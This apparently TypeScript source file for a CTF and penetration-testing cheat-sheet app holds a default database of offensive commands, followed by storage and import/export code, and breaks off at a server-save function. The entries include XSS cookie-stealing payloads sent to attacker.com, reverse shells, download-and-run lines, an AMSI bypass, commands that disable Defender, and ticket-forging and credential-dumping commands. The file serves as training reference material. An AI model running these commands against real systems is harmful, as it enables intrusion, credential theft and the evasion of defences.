// Cheat Sheets Database - Similar to CVE Database with localStorage persistence

export interface CheatCommand {
  title: string;
  command: string;
  description?: string;
}

export interface CheatCategory {
  name: string;
  commands: CheatCommand[];
}

export interface CheatSheetData {
  id: string;
  name: string;
  color: string;
  categories: CheatCategory[];
}

export const defaultCheatSheets: CheatSheetData[] = [
  // Web Attacks - Cyan
  {
    id: "xss",
    name: "XSS",
    color: "#00d4aa",
    categories: [
      {
        name: "Basic Payloads",
        commands: [
          { title: "Alert Box", command: "<script>alert('XSS')</script>", description: "Basic XSS test" },
          { title: "Image Tag", command: "<img src=x onerror=alert('XSS')>", description: "XSS via image error" },
          { title: "SVG Payload", command: "<svg onload=alert('XSS')>", description: "SVG-based XSS" },
          { title: "Body Onload", command: "<body onload=alert('XSS')>", description: "Body tag XSS" },
        ],
      },
      {
        name: "Cookie Stealing",
        commands: [
          {
            title: "Steal Cookies",
            command: "<script>new Image().src='http://attacker.com/?c='+document.cookie</script>",
          },
          { title: "Fetch API", command: "<script>fetch('http://attacker.com/?c='+document.cookie)</script>" },
        ],
      },
    ],
  },
  {
    id: "sqli",
    name: "SQLi",
    color: "#00d4aa",
    categories: [
      {
        name: "Authentication Bypass",
        commands: [
          { title: "Basic Bypass", command: "' OR '1'='1", description: "Simple auth bypass" },
          { title: "Comment Bypass", command: "admin'--", description: "Comment out password check" },
          { title: "Union Select", command: "' UNION SELECT NULL,NULL--", description: "Union-based injection" },
        ],
      },
      {
        name: "SQLMap",
        commands: [
          {
            title: "Basic Scan",
            command: 'sqlmap -u "http://target.com/page?id=1" --dbs',
            description: "Enumerate databases",
          },
          { title: "Dump Tables", command: 'sqlmap -u "http://target.com/page?id=1" -D dbname --tables' },
          { title: "Dump Data", command: 'sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump' },
          { title: "OS Shell", command: 'sqlmap -u "http://target.com/page?id=1" --os-shell' },
        ],
      },
    ],
  },
  {
    id: "web-fuzz",
    name: "web-Fuzz",
    color: "#00d4aa",
    categories: [
      {
        name: "Gobuster",
        commands: [
          {
            title: "Directory Scan",
            command: "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt",
          },
          { title: "With Extensions", command: "gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt" },
          { title: "VHOST Scan", command: "gobuster vhost -u http://target.com -w subdomains.txt" },
        ],
      },
      {
        name: "Ffuf",
        commands: [
          { title: "Directory Fuzz", command: "ffuf -u http://target.com/FUZZ -w wordlist.txt" },
          {
            title: "Subdomain Fuzz",
            command: 'ffuf -u http://FUZZ.target.com -w subdomains.txt -H "Host: FUZZ.target.com"',
          },
          {
            title: "POST Data",
            command: 'ffuf -u http://target.com/login -X POST -d "user=FUZZ&pass=FUZZ" -w wordlist.txt',
          },
        ],
      },
    ],
  },
  {
    id: "command-injections",
    name: "Command Injections",
    color: "#00d4aa",
    categories: [
      {
        name: "Basic Payloads",
        commands: [
          { title: "Semicolon", command: "; id", description: "Command separator" },
          { title: "Pipe", command: "| id", description: "Pipe output" },
          { title: "AND", command: "&& id", description: "Chain commands" },
          { title: "Backticks", command: "`id`", description: "Command substitution" },
          { title: "Dollar", command: "$(id)", description: "Command substitution" },
        ],
      },
      {
        name: "Reverse Shells",
        commands: [
          { title: "Bash", command: "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" },
          { title: "Netcat", command: "nc -e /bin/bash ATTACKER_IP PORT" },
          {
            title: "Python",
            command:
              'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
          },
        ],
      },
    ],
  },
  {
    id: "file-upload",
    name: "File Upload Attacks",
    color: "#00d4aa",
    categories: [
      {
        name: "Bypass Techniques",
        commands: [
          { title: "Double Extension", command: "shell.php.jpg", description: "Bypass extension filter" },
          { title: "Null Byte", command: "shell.php%00.jpg", description: "Null byte injection" },
          { title: "Case Variation", command: "shell.PhP", description: "Case-insensitive bypass" },
          { title: "Content-Type", command: "Content-Type: image/jpeg", description: "MIME type spoofing" },
        ],
      },
    ],
  },
  // Nmap & Services - Red
  {
    id: "nmap",
    name: "Nmap",
    color: "#ff6b6b",
    categories: [
      {
        name: "Basic Scans",
        commands: [
          { title: "Quick Scan", command: "nmap -sC -sV -oA nmap/initial TARGET" },
          { title: "Full Port", command: "nmap -p- -oA nmap/allports TARGET" },
          { title: "UDP Scan", command: "nmap -sU --top-ports 100 TARGET" },
          { title: "Aggressive", command: "nmap -A -T4 TARGET" },
        ],
      },
      {
        name: "NSE Scripts",
        commands: [
          { title: "Vuln Scan", command: "nmap --script vuln TARGET" },
          { title: "SMB Enum", command: "nmap --script smb-enum-shares,smb-enum-users TARGET" },
          { title: "HTTP Enum", command: "nmap --script http-enum TARGET" },
        ],
      },
    ],
  },
  {
    id: "common-services",
    name: "Common Services",
    color: "#ff6b6b",
    categories: [
      {
        name: "SMB (445)",
        commands: [
          { title: "List Shares", command: "smbclient -L //TARGET -N" },
          { title: "Connect Share", command: "smbclient //TARGET/share -U user" },
          { title: "Enum4linux", command: "enum4linux -a TARGET" },
          { title: "CrackMapExec", command: "crackmapexec smb TARGET -u user -p pass --shares" },
        ],
      },
      {
        name: "FTP (21)",
        commands: [
          { title: "Anonymous Login", command: "ftp TARGET (user: anonymous)" },
          { title: "Download All", command: "wget -r ftp://TARGET/" },
        ],
      },
      {
        name: "SSH (22)",
        commands: [
          { title: "Connect", command: "ssh user@TARGET" },
          { title: "With Key", command: "ssh -i id_rsa user@TARGET" },
          { title: "Tunnel", command: "ssh -L 8080:localhost:80 user@TARGET" },
        ],
      },
    ],
  },
  // Privilege Escalation - Red
  {
    id: "linux-pe",
    name: "Linux PE",
    color: "#ff6b6b",
    categories: [
      {
        name: "Enumeration",
        commands: [
          {
            title: "LinPEAS",
            command: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
          },
          { title: "SUID Files", command: "find / -perm -4000 -type f 2>/dev/null" },
          { title: "Capabilities", command: "getcap -r / 2>/dev/null" },
          { title: "Writable Dirs", command: "find / -writable -type d 2>/dev/null" },
          { title: "Sudo -l", command: "sudo -l" },
        ],
      },
      {
        name: "GTFOBins",
        commands: [
          { title: "Vim SUID", command: "vim -c ':!/bin/sh'" },
          { title: "Python Sudo", command: "sudo python -c 'import os; os.system(\"/bin/sh\")'" },
          { title: "Perl Sudo", command: "sudo perl -e 'exec \"/bin/sh\";'" },
        ],
      },
    ],
  },
  {
    id: "windows-pe",
    name: "Windows PE",
    color: "#ff6b6b",
    categories: [
      {
        name: "Enumeration",
        commands: [
          { title: "WinPEAS", command: "winpeas.exe" },
          { title: "System Info", command: "systeminfo" },
          { title: "Current User", command: "whoami /priv" },
          { title: "Users", command: "net user" },
          { title: "Groups", command: "net localgroup administrators" },
        ],
      },
      {
        name: "Service Exploits",
        commands: [
          {
            title: "Unquoted Path",
            command: 'wmic service get name,pathname | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """',
          },
          { title: "Service Permissions", command: 'accesschk.exe /accepteula -uwcqv "Authenticated Users" *' },
        ],
      },
    ],
  },
  // Metasploit - Red
  {
    id: "metasploit",
    name: "Metasploit",
    color: "#ff6b6b",
    categories: [
      {
        name: "Basic Usage",
        commands: [
          { title: "Start Console", command: "msfconsole" },
          { title: "Search Exploit", command: "search type:exploit name:smb" },
          { title: "Use Module", command: "use exploit/windows/smb/ms17_010_eternalblue" },
          { title: "Show Options", command: "show options" },
          { title: "Set RHOSTS", command: "set RHOSTS TARGET" },
          { title: "Run", command: "exploit" },
        ],
      },
      {
        name: "Meterpreter",
        commands: [
          { title: "System Info", command: "sysinfo" },
          { title: "Get UID", command: "getuid" },
          { title: "Hashdump", command: "hashdump" },
          { title: "Background", command: "background" },
          { title: "Migrate", command: "migrate PID" },
        ],
      },
    ],
  },
  // Password Attacks - Red
  {
    id: "password-attack",
    name: "Password Attack",
    color: "#ff6b6b",
    categories: [
      {
        name: "Hashcat",
        commands: [
          { title: "NTLM", command: "hashcat -m 1000 hash.txt wordlist.txt" },
          { title: "MD5", command: "hashcat -m 0 hash.txt wordlist.txt" },
          { title: "SHA256", command: "hashcat -m 1400 hash.txt wordlist.txt" },
          { title: "With Rules", command: "hashcat -m 1000 hash.txt wordlist.txt -r best64.rule" },
        ],
      },
      {
        name: "John The Ripper",
        commands: [
          { title: "Default", command: "john hash.txt" },
          { title: "Wordlist", command: "john --wordlist=rockyou.txt hash.txt" },
          { title: "Show Cracked", command: "john --show hash.txt" },
        ],
      },
      {
        name: "Hydra",
        commands: [
          { title: "SSH Brute", command: "hydra -l user -P wordlist.txt ssh://TARGET" },
          {
            title: "HTTP POST",
            command:
              'hydra -l admin -P wordlist.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"',
          },
        ],
      },
    ],
  },
  // Active Directory - Dark/Gray
  {
    id: "ad-ldap",
    name: "AD LDAP",
    color: "#374151",
    categories: [
      {
        name: "Enumeration",
        commands: [
          { title: "Domain Info", command: 'ldapsearch -x -H ldap://DC-IP -b "DC=domain,DC=local"' },
          { title: "Users", command: 'ldapsearch -x -H ldap://DC-IP -b "DC=domain,DC=local" "(objectClass=user)"' },
          { title: "Groups", command: 'ldapsearch -x -H ldap://DC-IP -b "DC=domain,DC=local" "(objectClass=group)"' },
        ],
      },
    ],
  },
  {
    id: "ad-powerview",
    name: "AD PowerView",
    color: "#374151",
    categories: [
      {
        name: "Domain Enumeration",
        commands: [
          { title: "Import Module", command: "Import-Module .\\PowerView.ps1" },
          { title: "Domain Info", command: "Get-Domain" },
          { title: "Domain Users", command: "Get-DomainUser" },
          { title: "Domain Groups", command: "Get-DomainGroup" },
          { title: "Domain Admins", command: 'Get-DomainGroupMember "Domain Admins"' },
        ],
      },
      {
        name: "ACL Abuse",
        commands: [
          { title: "Find ACLs", command: "Find-InterestingDomainAcl" },
          { title: "User ACL", command: 'Get-DomainObjectAcl -Identity "username" -ResolveGUIDs' },
        ],
      },
    ],
  },
  {
    id: "ad-bloodhound",
    name: "AD BloodHound",
    color: "#374151",
    categories: [
      {
        name: "Collection",
        commands: [
          { title: "SharpHound", command: ".\\SharpHound.exe -c All" },
          { title: "Python Collector", command: "bloodhound-python -d domain.local -u user -p pass -ns DC-IP -c All" },
        ],
      },
      {
        name: "Queries",
        commands: [
          {
            title: "Find DA Path",
            command: 'MATCH p=shortestPath((n)-[*1..]->(m:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p',
          },
        ],
      },
    ],
  },
  {
    id: "ad-crackmapexec",
    name: "AD CrackMapExec",
    color: "#374151",
    categories: [
      {
        name: "SMB",
        commands: [
          { title: "Check Creds", command: "crackmapexec smb TARGET -u user -p pass" },
          { title: "Pass Hash", command: "crackmapexec smb TARGET -u user -H NTLM_HASH" },
          { title: "Enum Shares", command: "crackmapexec smb TARGET -u user -p pass --shares" },
          { title: "SAM Dump", command: "crackmapexec smb TARGET -u admin -p pass --sam" },
        ],
      },
      {
        name: "LDAP",
        commands: [
          { title: "Enum Users", command: "crackmapexec ldap TARGET -u user -p pass --users" },
          { title: "Kerberoast", command: "crackmapexec ldap TARGET -u user -p pass --kerberoasting output.txt" },
        ],
      },
    ],
  },
  {
    id: "ad-kerberos",
    name: "AD Kerberos",
    color: "#374151",
    categories: [
      {
        name: "Attacks",
        commands: [
          { title: "Kerberoast", command: "GetUserSPNs.py domain/user:pass -dc-ip DC-IP -request" },
          { title: "AS-REP Roast", command: "GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC-IP" },
          {
            title: "Golden Ticket",
            command: "ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator",
          },
          {
            title: "Silver Ticket",
            command:
              "ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/server.domain.local Administrator",
          },
        ],
      },
      {
        name: "Pass the Ticket",
        commands: [
          { title: "Export Ticket", command: "export KRB5CCNAME=/path/to/ticket.ccache" },
          { title: "Use with psexec", command: "psexec.py -k -no-pass domain/user@target" },
        ],
      },
    ],
  },
  {
    id: "lateral-movement",
    name: "Lateral Movement",
    color: "#374151",
    categories: [
      {
        name: "Impacket",
        commands: [
          { title: "PSExec", command: "psexec.py domain/user:pass@TARGET" },
          { title: "WMIExec", command: "wmiexec.py domain/user:pass@TARGET" },
          { title: "SMBExec", command: "smbexec.py domain/user:pass@TARGET" },
          { title: "ATExec", command: 'atexec.py domain/user:pass@TARGET "command"' },
        ],
      },
      {
        name: "Evil-WinRM",
        commands: [
          { title: "Connect", command: "evil-winrm -i TARGET -u user -p pass" },
          { title: "With Hash", command: "evil-winrm -i TARGET -u user -H NTLM_HASH" },
        ],
      },
    ],
  },
  // Pivoting - Red
  {
    id: "pivoting",
    name: "Pivoting",
    color: "#ff6b6b",
    categories: [
      {
        name: "SSH Tunneling",
        commands: [
          { title: "Local Forward", command: "ssh -L 8080:internal-host:80 user@pivot" },
          { title: "Remote Forward", command: "ssh -R 8080:localhost:80 user@pivot" },
          { title: "Dynamic SOCKS", command: "ssh -D 1080 user@pivot" },
        ],
      },
      {
        name: "Chisel",
        commands: [
          { title: "Server", command: "chisel server --reverse -p 8000" },
          { title: "Client Reverse", command: "chisel client ATTACKER:8000 R:socks" },
          { title: "Port Forward", command: "chisel client ATTACKER:8000 R:8080:internal:80" },
        ],
      },
      {
        name: "Proxychains",
        commands: [
          { title: "Use Proxy", command: "proxychains nmap -sT TARGET" },
          { title: "Config", command: 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf' },
        ],
      },
    ],
  },
  // C2 - Green
  {
    id: "c2",
    name: "C2",
    color: "#4ade80",
    categories: [
      {
        name: "Sliver",
        commands: [
          { title: "Generate Beacon", command: "generate beacon --http ATTACKER_IP --save /tmp/beacon" },
          { title: "Start Listener", command: "http" },
          { title: "Sessions", command: "sessions" },
          { title: "Use Session", command: "use SESSION_ID" },
        ],
      },
      {
        name: "Cobalt Strike",
        commands: [
          { title: "Start Team Server", command: "./teamserver ATTACKER_IP password" },
          { title: "Generate Payload", command: "Attacks -> Packages -> Windows Executable" },
        ],
      },
    ],
  },
  // File Transfers - Red
  {
    id: "file-transfers",
    name: "File Transfers",
    color: "#ff6b6b",
    categories: [
      {
        name: "Linux",
        commands: [
          { title: "Python HTTP", command: "python3 -m http.server 80" },
          { title: "Wget", command: "wget http://ATTACKER/file" },
          { title: "Curl", command: "curl http://ATTACKER/file -o file" },
          { title: "Netcat Send", command: "nc ATTACKER 4444 < file" },
          { title: "Netcat Recv", command: "nc -lvp 4444 > file" },
        ],
      },
      {
        name: "Windows",
        commands: [
          { title: "Certutil", command: "certutil -urlcache -f http://ATTACKER/file file.exe" },
          {
            title: "PowerShell",
            command: 'IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER/script.ps1")',
          },
          {
            title: "PowerShell File",
            command: '(New-Object Net.WebClient).DownloadFile("http://ATTACKER/file","C:\\file.exe")',
          },
        ],
      },
    ],
  },
  // Shell - Green
  {
    id: "shell",
    name: "Shell",
    color: "#4ade80",
    categories: [
      {
        name: "Reverse Shells",
        commands: [
          { title: "Bash", command: "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1" },
          { title: "Netcat", command: "nc -e /bin/bash ATTACKER PORT" },
          {
            title: "Netcat mkfifo",
            command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f",
          },
          {
            title: "Python",
            command:
              'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
          },
          { title: "PHP", command: 'php -r \'$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");\'' },
        ],
      },
      {
        name: "Shell Upgrade",
        commands: [
          { title: "Python PTY", command: "python -c 'import pty;pty.spawn(\"/bin/bash\")'" },
          { title: "Stty Raw", command: "stty raw -echo; fg" },
          { title: "Export Term", command: "export TERM=xterm" },
        ],
      },
    ],
  },
  // NTLM Relay - Red
  {
    id: "ntlm-relay",
    name: "NTLM Relay Attacks",
    color: "#ff6b6b",
    categories: [
      {
        name: "Responder",
        commands: [
          { title: "Start Responder", command: "responder -I eth0 -wrf" },
          { title: "Analyze Mode", command: "responder -I eth0 -A" },
        ],
      },
      {
        name: "NTLMRelayx",
        commands: [
          { title: "Relay to SMB", command: "ntlmrelayx.py -tf targets.txt -smb2support" },
          { title: "SAM Dump", command: "ntlmrelayx.py -tf targets.txt -smb2support --sam" },
          { title: "LDAP Relay", command: "ntlmrelayx.py -t ldap://DC-IP --escalate-user username" },
        ],
      },
    ],
  },
  // AD ADCS - Dark
  {
    id: "ad-adcs",
    name: "AD ADCS",
    color: "#374151",
    categories: [
      {
        name: "Enumeration",
        commands: [
          { title: "Certipy Find", command: "certipy find -u user@domain -p pass -dc-ip DC-IP" },
          { title: "Certify", command: "Certify.exe find /vulnerable" },
        ],
      },
      {
        name: "ESC1",
        commands: [
          {
            title: "Request Cert",
            command:
              "certipy req -u user@domain -p pass -ca CA-NAME -template TEMPLATE -upn administrator@domain -dc-ip DC-IP",
          },
          { title: "Auth with Cert", command: "certipy auth -pfx administrator.pfx -dc-ip DC-IP" },
        ],
      },
    ],
  },
  // Local Enumeration - Red
  {
    id: "local-enumeration",
    name: "Local Enumeration",
    color: "#ff6b6b",
    categories: [
      {
        name: "Linux",
        commands: [
          { title: "Current User", command: "id && whoami" },
          { title: "OS Version", command: "cat /etc/os-release" },
          { title: "Kernel", command: "uname -a" },
          { title: "Network", command: "ip a && ss -tulpn" },
          { title: "Processes", command: "ps aux" },
          { title: "Cron Jobs", command: "cat /etc/crontab && ls -la /etc/cron.*" },
        ],
      },
      {
        name: "Windows",
        commands: [
          { title: "User Info", command: "whoami /all" },
          { title: "System", command: "systeminfo" },
          { title: "Network", command: "ipconfig /all && netstat -ano" },
          { title: "Scheduled Tasks", command: "schtasks /query /fo LIST /v" },
        ],
      },
    ],
  },
  // PowerShell PowerView - Green
  {
    id: "powershell-powerview",
    name: "PowerShell PowerView",
    color: "#4ade80",
    categories: [
      {
        name: "Setup",
        commands: [
          { title: "Bypass Execution", command: "Set-ExecutionPolicy Bypass -Scope Process" },
          { title: "Import Module", command: ". .\\PowerView.ps1" },
          {
            title: "AMSI Bypass",
            command:
              "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
          },
        ],
      },
      {
        name: "Enumeration",
        commands: [
          { title: "Find Computers", command: "Get-DomainComputer | select dnshostname" },
          { title: "Find DCs", command: "Get-DomainController" },
          { title: "Find Shares", command: "Find-DomainShare -CheckShareAccess" },
          { title: "Find GPO", command: "Get-DomainGPO" },
        ],
      },
    ],
  },
  // Evasion - Red
  {
    id: "evasion",
    name: "Evasion Techniques",
    color: "#ff6b6b",
    categories: [
      {
        name: "AMSI Bypass",
        commands: [
          {
            title: "Basic Bypass",
            command:
              "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
          },
        ],
      },
      {
        name: "Defender",
        commands: [
          { title: "Disable Defender", command: "Set-MpPreference -DisableRealtimeMonitoring $true" },
          { title: "Exclusion Path", command: 'Add-MpPreference -ExclusionPath "C:\\Tools"' },
        ],
      },
    ],
  },
];

/* ================= STORAGE ================= */

const STORAGE_KEY = "ctf-cheatsheets-v2";

/* ================= LOAD / SAVE ================= */

/**
 * Deep clone utility to ensure we never share references
 */
const deepClone = <T,>(obj: T): T => JSON.parse(JSON.stringify(obj));

/**
 * Load database from localStorage with deep clone to prevent reference sharing
 */
const loadDatabase = (): CheatSheetData[] => {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (!raw) return deepClone(defaultCheatSheets);

    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : deepClone(defaultCheatSheets);
  } catch {
    return deepClone(defaultCheatSheets);
  }
};

/**
 * Load fresh database directly from localStorage (bypasses cache)
 */
const loadFreshFromStorage = (): CheatSheetData[] => {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (!raw) return deepClone(defaultCheatSheets);
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : deepClone(defaultCheatSheets);
  } catch {
    return deepClone(defaultCheatSheets);
  }
};

const saveDatabase = (db: CheatSheetData[]) => {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(db));
};

/* ================= INTERNAL STATE ================= */

let cheatSheetsDatabase: CheatSheetData[] = loadDatabase();

/* ================= CRUD ================= */

/**
 * Get all cheat sheets - returns a deep clone to prevent mutation
 */
export const getAllCheatSheets = (): CheatSheetData[] => deepClone(cheatSheetsDatabase);

/**
 * Get cheat sheet by ID - returns a deep clone to prevent mutation
 */
export function getCheatSheetById(id: string): CheatSheetData | undefined {
  const sheet = cheatSheetsDatabase.find((cs) => cs.id === id);
  return sheet ? deepClone(sheet) : undefined;
}

export const addCheatSheet = (sheet: CheatSheetData): boolean => {
  if (getCheatSheetById(sheet.id)) return false;
  cheatSheetsDatabase.push(sheet);
  saveDatabase(cheatSheetsDatabase);
  return true;
};

export const updateCheatSheet = (sheet: CheatSheetData): boolean => {
  const index = cheatSheetsDatabase.findIndex((s) => s.id === sheet.id);
  if (index === -1) return false;
  cheatSheetsDatabase[index] = sheet;
  saveDatabase(cheatSheetsDatabase);
  return true;
};

export const deleteCheatSheet = (id: string): boolean => {
  const before = cheatSheetsDatabase.length;
  cheatSheetsDatabase = cheatSheetsDatabase.filter((s) => s.id !== id);
  if (cheatSheetsDatabase.length === before) return false;
  saveDatabase(cheatSheetsDatabase);
  return true;
};

/* ================= IMPORT / EXPORT ================= */

// Keys for OPSEC notes and custom variables in localStorage
const OPSEC_NOTES_KEY = "ctf-opsec-notes";
const CUSTOM_VARIABLES_KEY = "ctf-custom-variables";

// Interface for the full database export (includes OPSEC notes and custom variables)
interface FullDatabaseExport {
  version: 2;
  cheatSheets: CheatSheetData[];
  opsecNotes: Record<string, string>;
  customVariables: Array<{ id: string; name: string; value: string }>;
}

/**
 * Get OPSEC notes from localStorage
 */
const getOpsecNotes = (): Record<string, string> => {
  try {
    return JSON.parse(localStorage.getItem(OPSEC_NOTES_KEY) || "{}");
  } catch {
    return {};
  }
};

/**
 * Get custom variables from localStorage
 */
const getCustomVariables = (): Array<{ id: string; name: string; value: string }> => {
  try {
    return JSON.parse(localStorage.getItem(CUSTOM_VARIABLES_KEY) || "[]");
  } catch {
    return [];
  }
};

/**
 * Save OPSEC notes to localStorage
 */
const saveOpsecNotes = (notes: Record<string, string>) => {
  localStorage.setItem(OPSEC_NOTES_KEY, JSON.stringify(notes));
};

/**
 * Save custom variables to localStorage
 */
const saveCustomVariables = (vars: Array<{ id: string; name: string; value: string }>) => {
  localStorage.setItem(CUSTOM_VARIABLES_KEY, JSON.stringify(vars));
};

/**
 * Export cheat sheets database to a JSON file.
 * ALWAYS reads fresh data directly from localStorage to ensure latest data is exported.
 * NOW INCLUDES: OPSEC notes and custom variables!
 */
export const exportCheatSheetsDatabaseToFile = (): void => {
  // CRITICAL: Read directly from localStorage, NOT from cached variable
  const freshData = loadFreshFromStorage();
  const opsecNotes = getOpsecNotes();
  const customVariables = getCustomVariables();

  // Debug logging
  console.log("[CheatSheets Export] OPSEC Notes from localStorage:", opsecNotes);
  console.log("[CheatSheets Export] Custom Variables from localStorage:", customVariables);
  console.log("[CheatSheets Export] Raw localStorage OPSEC:", localStorage.getItem("ctf-opsec-notes"));

  // Create full export with version 2 format
  const fullExport: FullDatabaseExport = {
    version: 2,
    cheatSheets: freshData,
    opsecNotes,
    customVariables,
  };

  const blob = new Blob([JSON.stringify(fullExport, null, 2)], { type: "application/json" });

  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "cheatsheets-database.json";
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
};

/**
 * Import cheat sheets database from a JSON file (replaces all existing data).
 * Properly syncs the in-memory cache after importing.
 * NOW HANDLES: Both v1 (array) and v2 (object with opsecNotes) formats!
 */
export const importCheatSheetsDatabaseFromFile = (
  file: File,
): Promise<{ success: boolean; count: number; error?: string }> => {
  return new Promise((resolve) => {
    const reader = new FileReader();
    reader.onload = () => {
      try {
        const parsed = JSON.parse(reader.result as string);

        let sheetsToImport: CheatSheetData[];
        let opsecNotesToImport: Record<string, string> = {};
        let customVariablesToImport: Array<{ id: string; name: string; value: string }> = [];

        // Handle v2 format (object with version)
        if (parsed && typeof parsed === "object" && parsed.version === 2) {
          if (!Array.isArray(parsed.cheatSheets)) {
            resolve({ success: false, count: 0, error: "Invalid v2 format: missing cheatSheets array" });
            return;
          }
          sheetsToImport = parsed.cheatSheets;
          opsecNotesToImport = parsed.opsecNotes || {};
          customVariablesToImport = parsed.customVariables || [];
        }
        // Handle v1 format (direct array)
        else if (Array.isArray(parsed)) {
          sheetsToImport = parsed;
        } else {
          resolve({ success: false, count: 0, error: "Invalid format: expected an array or v2 object" });
          return;
        }

        // Deep clone to ensure no reference issues
        const cleanData = deepClone(sheetsToImport);

        // Save cheat sheets to localStorage first
        saveDatabase(cleanData);

        // Save OPSEC notes (replace existing)
        saveOpsecNotes(opsecNotesToImport);

        // Save custom variables (replace existing)
        saveCustomVariables(customVariablesToImport);

        // Then update the in-memory cache
        cheatSheetsDatabase = loadFreshFromStorage();

        resolve({ success: true, count: cleanData.length });
      } catch (e) {
        resolve({ success: false, count: 0, error: "Invalid JSON: " + String(e) });
      }
    };
    reader.onerror = () => {
      resolve({ success: false, count: 0, error: "Failed to read file" });
    };
    reader.readAsText(file);
  });
};

/**
 * Merge cheat sheets from a JSON file (adds new ones, skips existing).
 * Properly syncs the in-memory cache after merging.
 * NOW HANDLES: Both v1 and v2 formats, merges OPSEC notes!
 */
export const mergeCheatSheetsDatabaseFromFile = (
  file: File,
): Promise<{ success: boolean; added: number; skipped: number }> => {
  return new Promise((resolve) => {
    const reader = new FileReader();
    reader.onload = () => {
      try {
        const parsed = JSON.parse(reader.result as string);

        let sheetsToMerge: CheatSheetData[];
        let opsecNotesToMerge: Record<string, string> = {};
        let customVariablesToMerge: Array<{ id: string; name: string; value: string }> = [];

        // Handle v2 format
        if (parsed && typeof parsed === "object" && parsed.version === 2) {
          if (!Array.isArray(parsed.cheatSheets)) {
            resolve({ success: false, added: 0, skipped: 0 });
            return;
          }
          sheetsToMerge = parsed.cheatSheets;
          opsecNotesToMerge = parsed.opsecNotes || {};
          customVariablesToMerge = parsed.customVariables || [];
        }
        // Handle v1 format
        else if (Array.isArray(parsed)) {
          sheetsToMerge = parsed;
        } else {
          resolve({ success: false, added: 0, skipped: 0 });
          return;
        }

        // Reload fresh data from localStorage first
        cheatSheetsDatabase = loadFreshFromStorage();

        let added = 0;
        let skipped = 0;

        sheetsToMerge.forEach((sheet: CheatSheetData) => {
          const exists = cheatSheetsDatabase.some((s) => s.id === sheet.id);
          if (!exists) {
            // Deep clone the incoming sheet to prevent reference issues
            cheatSheetsDatabase.push(deepClone(sheet));
            added++;
          } else {
            skipped++;
          }
        });

        // Save merged cheat sheets to localStorage
        saveDatabase(cheatSheetsDatabase);

        // Merge OPSEC notes (keep existing, add new)
        const existingOpsecNotes = getOpsecNotes();
        const mergedOpsecNotes = { ...existingOpsecNotes };
        for (const [key, value] of Object.entries(opsecNotesToMerge)) {
          if (!mergedOpsecNotes[key]) {
            mergedOpsecNotes[key] = value;
          }
        }
        saveOpsecNotes(mergedOpsecNotes);

        // Merge custom variables (keep existing, add new by name)
        const existingVars = getCustomVariables();
        const existingVarNames = new Set(existingVars.map((v) => v.name));
        const newVars = customVariablesToMerge.filter((v) => !existingVarNames.has(v.name));
        saveCustomVariables([...existingVars, ...newVars]);

        resolve({ success: true, added, skipped });
      } catch {
        resolve({ success: false, added: 0, skipped: 0 });
      }
    };
    reader.onerror = () => {
      resolve({ success: false, added: 0, skipped: 0 });
    };
    reader.readAsText(file);
  });
};

/**
 * Reset cheat sheets database to default values.
 * Properly saves to localStorage and syncs the in-memory cache.
 * NOW ALSO CLEARS: OPSEC notes and custom variables!
 */
export const resetCheatSheetsDatabaseToDefaults = (): void => {
  // Create a deep copy of defaults to prevent reference issues
  const defaults = deepClone(defaultCheatSheets);
  // Save to localStorage first
  saveDatabase(defaults);
  // Clear OPSEC notes
  saveOpsecNotes({});
  // Clear custom variables
  saveCustomVariables([]);
  // Then reload the in-memory cache from localStorage
  cheatSheetsDatabase = loadFreshFromStorage();
};

/**
 * Reload the in-memory cache from localStorage.
 * Useful after external modifications to localStorage.
 */
export const reloadCheatSheetsDatabase = (): void => {
  cheatSheetsDatabase = loadFreshFromStorage();
};

// ============================================================================
// BACKEND SERVER INTEGRATION
// ============================================================================

const CHEATSHEET_BACKEND_URL = "http://localhost:3001";

/**
 * Normalize cheat sheet data to ensure all optional fields are present
 */
const normalizeCheatSheet = (sheet: CheatSheetData): CheatSheetData => ({
  id: sheet.id || "",
  name: sheet.name || "",
  color: sheet.color || "#00d4aa",
  categories: (sheet.categories || []).map((cat) => ({
    name: cat.name || "",
    commands: (cat.commands || []).map((cmd) => ({
      title: cmd.title || "",
      command: cmd.command || "",
      description: cmd.description,
    })),
  })),
});

/**
 * Save cheat sheets database to backend server.
 * Sends POST request with full database including OPSEC notes and custom variables.
 */
export const saveCheatSheetsDatabaseToServer = async (): Promise<{
  success: boolean;
  error?: string;
}> => {
